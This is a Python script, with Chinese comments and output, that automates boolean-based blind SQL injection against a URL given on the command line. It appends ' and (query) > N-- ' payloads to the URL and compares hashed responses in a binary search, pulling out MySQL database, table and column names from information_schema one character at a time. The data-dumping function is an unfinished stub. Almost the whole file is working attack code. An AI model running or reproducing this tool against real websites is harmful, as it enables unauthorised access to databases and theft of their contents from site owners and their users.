#!/usr/bin/env python
#encoding: utf-8

from optparse import OptionParser
import sys
import requests
import hashlib

parser=OptionParser()

parser.add_option("-D", "--database", action="store",type="string",dest="database",help="Please input test databases")
parser.add_option("-T", "--table",action="store",type="string",dest="table",help="Please input test table")
parser.add_option("-C", "--column",action="store",type="string",dest="column",help="Please input test column")
parser.add_option("-U","--url", action="store",type="string",dest="url",help="Please input test url")

(options,args) = parser.parse_args()

def main():
    if options.url == None and options.database == None and options.table == None and options.column == None:
        print("Please read the help")
        parser.print_help()
        sys.exit()
    elif options.url != None and options.database ==None and options.table == None and options.column == None:
        get_all_databases(options.url)
    elif  options.url != None and options.database !=None and options.table == None and options.column == None:
        get_db_all_tables(options.url,options.database)
    elif  options.url != None and options.database !=None and options.table != None and options.column == None:
        get_db_tb_all_columns(options.url,options.database,options.table)
    elif  options.url != None and options.database !=None and options.table != None and options.column != None:
        getAllContent(options.url,options.database,options.table,options.column)



def http_get(url):
    result = requests.get(url)
    return result.content

#获取数据库
def get_all_databases(url):
	db_nums_payload = "select count(schema_name) from information_schema.schemata"
	db_numbers = half(url,db_nums_payload)
	print("数据库的总个数为：%d" % db_numbers)
	for x in range(db_numbers):
		db_len_payload = "select length(schema_name) from information_schema.schemata limit %d,1" % x
		db_name_numbers = half(url,db_len_payload)

		db_name = ""
		for y in range(1,db_name_numbers+1):
		 	
		 	db_name_payload = "ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))" % (x,y)
		 	db_name += chr(half(url,db_name_payload))

		print("第%d个数据库为：%s" % (x+1,db_name))



#获取指定数据库中的表
def get_db_all_tables(url,database):
    tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database
    tb_numbers = half(url,tb_nums_payload)
    print("%s数据库中的表个数为：%d" % (database,tb_numbers))

    for x in range(tb_numbers):
        tb_len_payload  = "select length(table_name) from information_schema.tables where table_schema = '%s' limit %d,1" % (database,x)
        
        tb_name_numbers = half(url,tb_len_payload)
        # print(tb_name_numbers)
        tb_name = ""
        for y in range(1,tb_name_numbers+1):
            
            tb_name_payload = "ascii(substr((select table_name from information_schema.tables where table_schema = '%s' limit %d,1),%d,1))" % (database,x,y)
            # print(tb_name_payload)                
            tb_name += chr(half(url,tb_name_payload))
            # print(tb_name)
        print(database,"数据库中第%d个表为：%s" % (x+1,tb_name))



#获取指定数据库中指定表的字段 
def get_db_tb_all_columns(url,database,table):
    co_nums_payload = "select count(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s'" % (database,table)
    co_numbers = half(url,co_nums_payload)
    print("%s 数据库中的 %s 表中的字段个数为：%d" % (database,table,co_numbers))
    for x in range(co_numbers):
        co_len_payload  = "select length(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1" % (database,table,x)
        co_name_numbers = half(url,co_len_payload)

        co_name = ""
        for y in range(1,co_name_numbers+1):
            
            co_name_payload = "ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))" % (database,table,x,y)
            co_name += chr(half(url,co_name_payload))

        print(database,"数据库中",table,"表中第%d个字段名为：%s" % (x+1,co_name))



#获取指定数据库中指定表中指定字段内容
def getAllContent():
    pass


#python里面没有MD5加密函数，需要自己写
def md5(str):
    hl = hashlib.md5()
    hl.update(str)
    return hl.hexdigest()


#二分法函数
def half(url,payload):
    low = 0
    high = 126
    standard_html = md5(http_get(url))
    # print(standard_html)
    while low <= high:
        mid=(low + high)/2
        mid_num_payload = url + " and (%s) > %d-- " % (payload,mid)
        # print(mid_num_payload)
        mid_html = md5(http_get(mid_num_payload))
        #print(mid_html)
        if mid_html == standard_html:
            low = mid + 1
        else:
            high = mid - 1 
    mid_num = int((low+high+1)/2)
    return mid_num


if __name__ == '__main__':
    main()